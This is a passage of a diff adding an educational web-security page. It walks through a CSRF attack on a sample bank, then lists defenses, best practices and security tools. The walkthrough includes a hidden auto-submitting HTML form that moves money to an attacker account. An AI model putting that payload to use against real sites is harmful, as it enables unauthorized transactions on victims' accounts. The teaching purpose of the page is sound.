+                  Vulnerable Banking Site
+                </h3>
+                <p style="margin-bottom: 1rem">
+                  Bank allows money transfers via simple POST request
+                </p>
+                <div class="code-example">
+                  POST /transfer HTTP/1.1<br />
+                  Host: bank.com<br />
+                  Cookie: session=abc123<br />
+                  <br />
+                  amount=1000&to_account=attacker_account
+                </div>
+              </div>
+            </div>
+
+            <div class="step-item">
+              <div class="step-number">2</div>
+              <div>
+                <h3 style="color: #2563eb; margin-bottom: 0.5rem">
+                  Malicious Website
+                </h3>
+                <p style="margin-bottom: 1rem">
+                  Attacker creates page with hidden form that auto-submits
+                </p>
+                <div class="code-example">
+                  &lt;form action="https://bank.com/transfer" method="POST"
+                  id="evil"&gt;<br />
+                  &nbsp;&nbsp;&lt;input type="hidden" name="amount"
+                  value="1000"&gt;<br />
+                  &nbsp;&nbsp;&lt;input type="hidden" name="to_account"
+                  value="attacker_account"&gt;<br />
+                  &lt;/form&gt;<br />
+                  &lt;script&gt;document.getElementById('evil').submit();&lt;/script&gt;
+                </div>
+              </div>
+            </div>
+
+            <div class="step-item">
+              <div class="step-number">3</div>
+              <div>
+                <h3 style="color: #ef4444; margin-bottom: 0.5rem">
+                  Successful Attack
+                </h3>
+                <p style="margin-bottom: 1rem">
+                  User's browser automatically includes authentication cookies
+                </p>
+                <div
+                  style="
+                    background: #fef2f2;
+                    padding: 1rem;
+                    border-radius: 8px;
+                    border-left: 4px solid #ef4444;
+                  "
+                >
+                  <strong>Result:</strong> Money transferred without user's
+                  knowledge!
+                </div>
+              </div>
+            </div>
+
+            <div class="step-item">
+              <div class="step-number">4</div>
+              <div>
+                <h3 style="color: #10b981; margin-bottom: 0.5rem">
+                  ✅ CSRF Protection
+                </h3>
+                <p style="margin-bottom: 1rem">
+                  Use CSRF tokens to verify request authenticity
+                </p>
+                <div class="code-example">
+                  # Generate unique token<br />
+                  csrf_token = generate_csrf_token()<br />
+                  <br />
+                  # Include in form<br />
+                  &lt;input type="hidden" name="csrf_token"
+                  value="${csrf_token}"&gt;<br />
+                  <br />
+                  # Verify on server<br />
+                  if not verify_csrf_token(request.form['csrf_token']):<br />
+                  &nbsp;&nbsp;&nbsp;&nbsp;return "Invalid CSRF token", 403
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- Security Best Practices -->
+        <section style="margin: 4rem 0">
+          <h2
+            style="
+              color: #1f2937;
+              font-size: 2.5rem;
+              margin-bottom: 2rem;
+              text-align: center;
+            "
+          >
+            🏆 Security Best Practices
+          </h2>
+
+          <div class="prevention-grid">
+            <div class="prevention-card">
+              <h3 style="color: #059669; margin-bottom: 1rem">
+                🛡️ Input Validation
+              </h3>
+              <ul style="margin: 0; padding-left: 1.2rem; line-height: 1.8">
+                <li>Validate all user input server-side</li>
+                <li>Use allowlists over blocklists</li>
+                <li>Sanitize and escape output</li>
+                <li>Use parameterized queries</li>
+                <li>Implement Content Security Policy (CSP)</li>
+              </ul>
+            </div>
+
+            <div class="prevention-card">
+              <h3 style="color: #059669; margin-bottom: 1rem">
+                🔐 Authentication
+              </h3>
+              <ul style="margin: 0; padding-left: 1.2rem; line-height: 1.8">
+                <li>Enforce strong password policies</li>
+                <li>Implement multi-factor authentication</li>
+                <li>Use secure session management</li>
+                <li>Lock accounts after failed attempts</li>
+                <li>Never store passwords in plain text</li>
+              </ul>
+            </div>
+
+            <div class="prevention-card">
+              <h3 style="color: #059669; margin-bottom: 1rem">
+                🔄 Access Control
+              </h3>
+              <ul style="margin: 0; padding-left: 1.2rem; line-height: 1.8">
+                <li>Implement principle of least privilege</li>
+                <li>Use role-based access control (RBAC)</li>
+                <li>Verify permissions on every request</li>
+                <li>Never rely on client-side authorization</li>
+                <li>Log all access attempts</li>
+              </ul>
+            </div>
+
+            <div class="prevention-card">
+              <h3 style="color: #059669; margin-bottom: 1rem">
+                📡 Communication
+              </h3>
+              <ul style="margin: 0; padding-left: 1.2rem; line-height: 1.8">
+                <li>Always use HTTPS in production</li>
+                <li>Implement HTTP Strict Transport Security</li>
+                <li>Validate SSL certificates</li>
+                <li>Use secure cookies (Secure, HttpOnly flags)</li>
+                <li>Implement proper CORS policies</li>
+              </ul>
+            </div>
+
+            <div class="prevention-card">
+              <h3 style="color: #059669; margin-bottom: 1rem">
+                🔧 Configuration
+              </h3>
+              <ul style="margin: 0; padding-left: 1.2rem; line-height: 1.8">
+                <li>Remove default accounts and passwords</li>
+                <li>Disable unnecessary features/services</li>
+                <li>Keep all software updated</li>
+                <li>Use security headers</li>
+                <li>Regular security audits</li>
+              </ul>
+            </div>
+
+            <div class="prevention-card">
+              <h3 style="color: #059669; margin-bottom: 1rem">📊 Monitoring</h3>
+              <ul style="margin: 0; padding-left: 1.2rem; line-height: 1.8">
+                <li>Log security-relevant events</li>
+                <li>Monitor for suspicious patterns</li>
+                <li>Set up real-time alerts</li>
+                <li>Regular security testing</li>
+                <li>Incident response plan</li>
+              </ul>
+            </div>
+          </div>
+        </section>
+
+        <!-- Security Tools -->
+        <section style="margin: 4rem 0">
+          <h2
+            style="
+              color: #1f2937;
+              font-size: 2.5rem;
+              margin-bottom: 2rem;
+              text-align: center;
+            "
+          >
+            🔨 Essential Security Tools
+          </h2>
+
+          <div
+            style="
+              display: grid;
+              grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+              gap: 2rem;
+            "
+          >
+            <div
+              style="
+                background: white;
+                border: 1px solid #e5e7eb;
+                border-radius: 12px;
+                padding: 2rem;
+              "
+            >
+              <h3 style="color: #2563eb; margin-bottom: 1rem">
+                🔍 Static Analysis
+              </h3>
+              <ul style="margin: 0; padding-left: 1.2rem; line-height: 1.8">
+                <li><strong>SonarQube</strong> - Code quality & security</li>
+                <li><strong>ESLint Security</strong> - JavaScript security</li>
+                <li><strong>Bandit</strong> - Python security linter</li>
+                <li><strong>Brakeman</strong> - Ruby on Rails scanner</li>
+              </ul>
+            </div>
+
+            <div
+              style="
+                background: white;
+                border: 1px solid #e5e7eb;
+                border-radius: 12px;
+                padding: 2rem;
+              "
+            >
+              <h3 style="color: #2563eb; margin-bottom: 1rem">
+                🕷️ Dynamic Testing
+              </h3>
+              <ul style="margin: 0; padding-left: 1.2rem; line-height: 1.8">
+                <li><strong>OWASP ZAP</strong> - Web app security scanner</li>
+                <li>
+                  <strong>Burp Suite</strong> - Professional security testing
+                </li>
+                <li><strong>Nikto</strong> - Web server scanner</li>
+                <li><strong>SQLmap</strong> - SQL injection testing</li>
+              </ul>
+            </div>
+
+            <div
+              style="
+                background: white;
+                border: 1px solid #e5e7eb;
+                border-radius: 12px;
+                padding: 2rem;
+              "
+            >
+              <h3 style="color: #2563eb; margin-bottom: 1rem">
+                📦 Dependency Scanning
+              </h3>
+              <ul style="margin: 0; padding-left: 1.2rem; line-height: 1.8">
+                <li><strong>npm audit</strong> - Node.js vulnerabilities</li>
+                <li><strong>Snyk</strong> - Multi-language scanning</li>
+                <li>
+                  <strong>OWASP Dependency-Check</strong> - Known
+                  vulnerabilities
+                </li>
+                <li><strong>GitHub Security</strong> - Automated alerts</li>
+              </ul>
+            </div>
+          </div>
+        </section>
+      </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+      <div class="container">
+        <div class="footer-content">
+          <p>
+            &copy; 2024 Technical Reference. Built with modern web standards.
+          </p>
+        </div>
+      </div>
+    </footer>
+
+    <script src="js/main.js"></script>
+  </body>
+</html>
